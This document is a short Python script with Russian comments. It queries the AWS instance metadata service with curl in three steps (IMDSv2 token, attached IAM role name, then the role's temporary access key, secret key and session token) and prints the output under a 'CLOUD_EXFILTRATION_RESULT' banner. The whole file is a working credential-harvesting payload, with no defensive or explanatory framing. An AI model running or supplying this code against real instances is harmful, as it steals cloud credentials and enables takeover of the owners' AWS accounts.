import subprocess

def get_aws_iam_creds():
    # Этап 1: Получаем сессионный токен IMDSv2 (обязательно для современных инстансов AWS)
    token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600'"
    token = subprocess.getoutput(token_cmd).strip()
    
    if not token or "html" in token.lower() or len(token) < 32:
        return "IMDSv2_TOKEN_FAILED (Access Blocked)"

    # Этап 2: Узнаем имя привязанной IAM-роли
    role_name_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    role_name = subprocess.getoutput(role_name_cmd).strip()
    
    if not role_name:
        return f"TOKEN_OK_BUT_NO_ROLE_FOUND (Token: {token[:10]}...)"

    # Этап 3: Получаем временные Access Key, Secret Key и Session Token
    creds_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
    iam_json = subprocess.getoutput(creds_cmd)
    
    return iam_json

# Запуск и вывод
result = get_aws_iam_creds()
print(f"--- [CLOUD_EXFILTRATION_RESULT] ---")
print(result)
print(f"--- [END_LOG] ---")